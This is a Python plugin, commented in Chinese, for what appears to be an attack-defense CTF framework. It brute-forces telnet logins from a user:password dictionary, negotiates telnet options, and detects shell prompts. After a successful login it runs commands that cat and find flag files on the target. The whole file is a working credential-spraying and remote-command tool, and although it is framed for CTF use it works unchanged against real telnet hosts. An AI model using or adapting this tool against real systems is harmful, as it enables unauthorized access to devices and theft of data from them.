"""Telnet 默认口令喷洒。

先连上去看登录提示，读字典逐个试；登录成功就执行取 flag 的命令。
"""

from __future__ import annotations

import re
import socket
import time
from typing import Any

from ..targets import Target
from .base import (
    Emit,
    Finding,
    Param,
    Plugin,
    find_flags,
    parse_credentials,
    read_text_param,
)

IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240

LOGIN_PROMPTS = [r"(?i)login\s*:\s*$", r"(?i)username\s*:\s*$", r"(?i)user\s*:\s*$"]
PASSWORD_PROMPTS = [r"(?i)password\s*:\s*$"]
FAILURE_HINTS = [
    r"(?i)login incorrect",
    r"(?i)authentication fail",
    r"(?i)access denied",
    r"(?i)permission denied",
    r"(?i)invalid password",
]
SHELL_PROMPTS = [r"(?m)[$#]\s*$", r"(?m)[\w@.\-]+[^\n]{0,40}[$#]\s*$"]

DEFAULT_COMMANDS = (
    "cat /flag /flag.txt /root/flag /root/flag.txt /tmp/flag 2>/dev/null; "
    "find / -maxdepth 3 -name 'flag*' -type f 2>/dev/null | head -5 | xargs cat 2>/dev/null"
)


class TelnetSession:
    def __init__(self, host: str, port: int, timeout: float) -> None:
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buffer = ""

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    def _strip_iac(self, data: bytes) -> bytes:
        clean = bytearray()
        reply = bytearray()
        i = 0
        while i < len(data):
            byte = data[i]
            if byte != IAC:
                clean.append(byte)
                i += 1
                continue
            if i + 1 >= len(data):
                break
            cmd = data[i + 1]
            if cmd == IAC:
                clean.append(IAC)
                i += 2
            elif cmd in (DO, DONT, WILL, WONT):
                if i + 2 >= len(data):
                    break
                option = data[i + 2]
                if cmd == DO:
                    reply += bytes([IAC, WONT, option])
                elif cmd == WILL:
                    reply += bytes([IAC, DONT, option])
                i += 3
            elif cmd == SB:
                end = data.find(bytes([IAC, SE]), i + 2)
                i = end + 2 if end != -1 else len(data)
            else:
                i += 2
        if reply:
            try:
                self.sock.sendall(bytes(reply))
            except OSError:
                pass
        return bytes(clean)

    def send(self, text: str) -> None:
        self.sock.sendall(text.encode("utf-8", "replace"))

    def read_until(self, patterns: list[str], timeout: float) -> str:
        self.buffer = ""
        deadline = time.monotonic() + timeout
        compiled = [re.compile(p) for p in patterns]
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return self.buffer
            self.sock.settimeout(remaining)
            try:
                chunk = self._strip_iac(self.sock.recv(4096))
            except (socket.timeout, TimeoutError):
                return self.buffer
            if not chunk:
                return self.buffer
            self.buffer += chunk.decode("utf-8", "replace")
            if any(p.search(self.buffer) for p in compiled):
                return self.buffer


def _matched(text: str, patterns: list[str]) -> bool:
    return any(re.search(p, text) for p in patterns)


def _try_login(session: TelnetSession, user: str, password: str, timeout: float) -> bool:
    banner = session.read_until(LOGIN_PROMPTS + SHELL_PROMPTS, timeout)
    if not _matched(banner, LOGIN_PROMPTS) and _matched(banner, SHELL_PROMPTS):
        return True  # 有的服务直连就是 shell
    session.send(user + "\n")
    session.read_until(PASSWORD_PROMPTS + FAILURE_HINTS, timeout)
    session.send(password + "\n")
    result = session.read_until(SHELL_PROMPTS + FAILURE_HINTS + LOGIN_PROMPTS, timeout)
    if _matched(result, FAILURE_HINTS):
        return False
    if _matched(result, LOGIN_PROMPTS) and not _matched(result, SHELL_PROMPTS):
        return False
    return True


class TelnetBrute(Plugin):
    name = "telnet_brute"
    title = "Telnet 默认口令喷洒"
    description = "读账号字典批量试 telnet 登录，成功后执行命令取 flag。"
    default_port = 23
    params = [
        Param("cred_file", "账号字典文件", "file", "", help="每行 user:pass 或 user pass，路径相对当前目录"),
        Param("credentials", "或直接填账号", "textarea", "", help="每行 user:pass，和上面的文件二选一", rows=4),
        Param("commands", "登录后执行命令", "textarea", DEFAULT_COMMANDS, rows=2),
        Param("timeout", "连接超时(秒)", "float", 8),
        Param("max_tries", "每目标最多尝试", "int", 20),
        Param("flag_regex", "flag 标记或正则(可选)", "text", "",
              help="填 flag{ 或 flag 就行，会自动补全；要精确控制再写完整正则"),
    ]

    def run(self, target: Target, params: dict[str, Any], emit: Emit) -> list[Finding] | None:
        creds: list[tuple[str, str]] = []
        if params.get("cred_file"):
            creds.extend(parse_credentials(read_text_param(params["cred_file"], "账号字典")))
        if params.get("credentials"):
            creds.extend(parse_credentials(params["credentials"]))
        if not creds:
            emit("error", "没有可用账号，先给字典文件或直接填账号")
            return None

        seen: set[tuple[str, str]] = set()
        unique: list[tuple[str, str]] = []
        for cred in creds:
            if cred not in seen:
                seen.add(cred)
                unique.append(cred)

        timeout = float(params.get("timeout") or 8)
        max_tries = int(params.get("max_tries") or 20)
        port = target.port or self.default_port
        commands = str(params.get("commands") or DEFAULT_COMMANDS)
        extra_regex = [params["flag_regex"]] if params.get("flag_regex") else []

        for index, (user, password) in enumerate(unique[:max_tries], start=1):
            session = None
            try:
                session = TelnetSession(target.host, port, timeout)
                if not _try_login(session, user, password, timeout):
                    emit("debug", f"[{index}] {user}:{password} 失败")
                    continue
                emit("ok", f"登录成功 {user}:{password}")
                session.send(commands + "\n")
                output = session.read_until(SHELL_PROMPTS + [r"__awd4all_done__"], 6)
                if not output:
                    output = session.buffer
                flags = find_flags(output, extra_regex)
                if flags:
                    emit("ok", f"拿到 flag: {flags[0]}")
                    return [
                        Finding(
                            target=target.label,
                            plugin=self.name,
                            flag=flag,
                            evidence=output[-1500:],
                            extra={"user": user, "password": password},
                        )
                        for flag in flags
                    ]
                emit("warn", f"登录成功但没读到 flag: {user}:{password}")
                return [
                    Finding(
                        target=target.label,
                        plugin=self.name,
                        flag="",
                        evidence=output[-800:],
                        extra={"user": user, "password": password},
                    )
                ]
            except (OSError, ValueError) as exc:
                emit("debug", f"连接异常: {exc}")
                return None
            finally:
                if session:
                    session.close()
        emit("warn", "字典已试完，没登上")
        return None
